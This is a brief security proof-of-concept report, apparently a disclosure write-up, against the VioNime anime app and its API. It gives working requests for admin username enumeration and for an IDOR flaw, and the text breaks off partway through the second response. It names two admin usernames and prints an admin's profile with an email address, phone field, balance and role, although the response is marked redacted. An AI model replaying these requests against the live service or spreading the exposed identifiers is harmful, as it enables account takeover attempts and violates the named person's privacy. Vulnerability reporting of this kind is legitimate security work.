# VioNime Security Proof of Concept

**Date:** 2026-08-31
**Tester:** haitravas (ID: 569)
**Target:** VioNime v1.6.2 (com.kyorudesu) + API vionime.xyz

---

# EXECUTION TRACE 1: Admin Username Enumeration

**Request:**
```
POST /api/admin/login
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Body: {"username":"yareee","password":"wrong"}
```

**Response:**
```json
{"message":"Password salah"}
```

**Impact:** Admin usernames confirmed: `yareee`, `zxuri`. Other usernames return "Username tidak ditemukan".

---

# EXECUTION TRACE 2: IDOR — Full Admin Profile Exposed

**Request:**
```
GET /api/user/profile/13
Authorization: Bearer haitravas_token
```

**Response (redacted):**
```json
{
  "id": "13",
  "username": "Yareee",
  "email": "seinavoncley@gmail.com",
  "phone": "08888888888",
  "balance": 1000012149,
  "isAdmin": true,
  "adminRole": "developer",
